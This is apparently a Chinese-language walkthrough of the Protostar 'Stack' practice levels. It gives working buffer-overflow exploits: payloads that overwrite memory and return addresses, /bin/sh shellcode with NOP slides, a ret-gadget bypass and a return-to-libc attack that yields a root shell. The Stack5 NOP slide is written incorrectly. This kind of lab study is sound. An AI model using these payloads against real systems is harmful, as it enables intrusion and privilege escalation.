# Stack

## Stack0

先蓋 64 個字

再蓋下去就是 modified (目標)

這題只要讓 modified != 0

所以隨便蓋就好

`python -c "print 'A'*64+'whatever'" | ./stack0`

## Stack1

這題 modified 和 buffer 的相對距離一樣是 64 個字

但是要把 modified 變成 0x61626364 (小心 little endian)

注意 input 是從 argv 參數進來的 (我用 xargs 把 python 產生的字給 stack1 當參數)

`python -c "print 'A'*64+'dcba'" | xargs ./stack1`

## Stack2

這題也一樣

不過 input 變成從 GREENIE(環境變數) 拿值進來

```
GREENIE=$(python -c "print 'A'*64+'\x0a\x0d\x0a\x0d'")
export GREENIE
./stack2
```

## Stack 3

這題要把 fp (function pointer) 改成 win 這個函式的位置

offset (buffer 和 fp 的相對距離) 也一樣是 64 bytes (也就是先蓋 64 個字之後就蓋到目標 fp 了)

先用 gdb 看 win 函式的位置 (在 gdb 下執行 `x win`) -> 0x8048424

`python -c "print 'A'*64+'\x24\x84\x04\x08'" | ./stack3`

## Stack4

這題要把 stack 上的 return address 改成 win 這個函式的位置

offset (buffer 和 return address 的相對距離) 是 76 bytes (也就是先蓋 64 個字之後就蓋到目標 return address 了)

先用 gdb 看 win 函式的位置 (在 gdb 下執行 `x win`) -> 0x80483f4

`python -c "print 'A'*76+'\xf4\x83\x04\x08'" | ./stack4`

## Stack5

這題要把 shellcode 塞到 stack 上執行囉~(興奮XD)

首先正確的蓋到 return_address (讓他 return 到 stack 後面一點的位置)

再建一個 nop 通道讓他滑到執行 shellcode

然後當然也要把 shell code 放到 stack 上

```python
import struct

padding = 'A'*76
return_address = struct.pack("I",0xbffff78c+50)
slide_path = '0x90'*100
shell_code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";
print padding + return_address + slide_path + shell_code
```

`( python exploit.py ; cat ) | ./stack5`

拿到 sh 了而且還是 root 的權限 (我們原本是 user 的權限)

## Stack6

這題和上一題差不多只要我們能 return 到我們塞的 shellcode 就好

可是多了這行 `if((ret & 0xbf000000) == 0xbf000000)` ( 如果成立就直接 exit )

而 0xbf 開頭的位址就包含了我們能控制的所有 stack

#### 作法一 : 

我們在 stack 上把 return address 和他的下一個位址改成 `ret` 那行 code 的位址和我們真正要 return 的位址

所以程式檢查 return address 是不是 0xbf 開頭 -> 當然不是因為現在的 return address 是 `ret` 那行 code 的位址

然後執行到 `ret` 時就會先 return 到 `ret` 那行 code ( 也就是再 return 一次 )

所以就會抓 stack 上面下一個值 return 到我們真正要 return 的位址 -> BINGO

```python
import struct

padding = "A"*80
ret_gadget = struct.pack("I",0x80484f9)
return_address = struct.pack("I",0xbffff78c+30)
nop_slide = "\x90"*100
shell_code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print padding + ret_gadget + return_address + nop_slide + shell_code
```

`( python exploit.py ; cat ) | ./stack6`

#### 作法二 : 

return to libc 的 system 函式並傳遞 "/bin/sh" 的參數進去

從 return address 開始蓋

蓋 libc 中 system 這個 function 的位址

蓋 system call 完要 return 的 address

蓋 "/bin/sh" 這個參數 ( 用 linux 指令 strings 去找 libc 裡面這個字串的位址 )

```python
import struct

padding = "A"*80
system = struct.pack("I",0xb7ecffb0)
return_after_system = "AAAA"
bin_sh = struct.pack("I",0xb7fb63bf)

print padding + system + return_after_system + bin_sh
```

`( python exploit2.py ; cat ) | ./stack6`

## Stack7

這次不給跳到 0xb 開頭的位址 ( Stack6 的作法二不能用了 )

和 Stack6 的作法一一樣先塞個 gadget ( 0x80 開頭 )

注意位址要再用 gdb 找一次喔

```python
import struct

padding = "A"*80
ret_gadget = struct.pack("I",0x8048544)
return_address = struct.pack("I",0xbffff77c+50)
nop_slide = "\x90"*100
shell_code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print padding + ret_gadget + return_address + nop_slide + shell_code
```

`( python exploit.py ; cat ) | ./stack7`
